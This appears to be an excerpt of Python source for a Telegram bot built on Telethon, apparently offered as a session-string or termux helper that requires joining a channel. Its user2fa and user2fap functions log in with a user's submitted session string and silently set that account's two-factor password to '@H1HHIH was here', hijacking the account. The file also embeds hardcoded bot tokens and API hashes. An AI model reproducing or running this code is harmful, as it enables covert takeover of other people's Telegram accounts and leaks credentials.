...
api_hash = "c2e7293196031e36a4e4a1b1287c9f30"
token = "6771558988:AAFZEqVxQtKJ0ekXhOxVV_1VLA-1ZenwvHU"
...
mybot = "hesho_gggbot"
bot = borg = client
Boxaihackr = 6596396930, 6596396930
Bot_Username =os.environ.get("hesho_gggbot", None)

Developers = [6596396930, 6596396930]
       ...
       if is_member:
        async with bot.conversation(event.chat_id) as x:
            keyboard = [
                ...
                [
                    Button.url('Developer', 'https://t.me/H1HHIH')
                ]
            ]
...
''', buttons=keyboard, link_preview=False)
        ...
        await event.respond("""Please join @huntersource for the bot to work!
        

الرجاء الانضمام إلى @huntersource حتى يعمل البوت""")
        return
...
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    ...
    try:
      await X.edit_2fa('@H1HHIH was here')
      return True
    except:
      return False
...
async def user2fap(strses):
    ...
    await bot.connect()
    try:
      await bot.edit_2fa('@H1HHIH was here')
      return True
    except:
      return False
...
ترمكس خاطئ، حاول آخر""", buttons=keyboard)
            try:
                ...
                await message.edit(info + "\n\n Generate by@U_7h1", buttons=keyboard)
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")
...
خطا غير معلوم error 48520 oery2hqouro3q273y1034ur23oq8w4iuhnfowkuaysrfoil3qw""")
                ...
                await event.respond("""Send this error code to -@U_7h1\n**LOGS**\n
...
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
    ...
    keyboard = [
        ...
        [
            Button.url("Dev", "https://t.me/H1HHIH")
        ]
    ]
...
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
    ...
    keyboard = [
        ...
        [
            Button.url("Dev", "https://t.me/F0_EX")
        ]
    ]
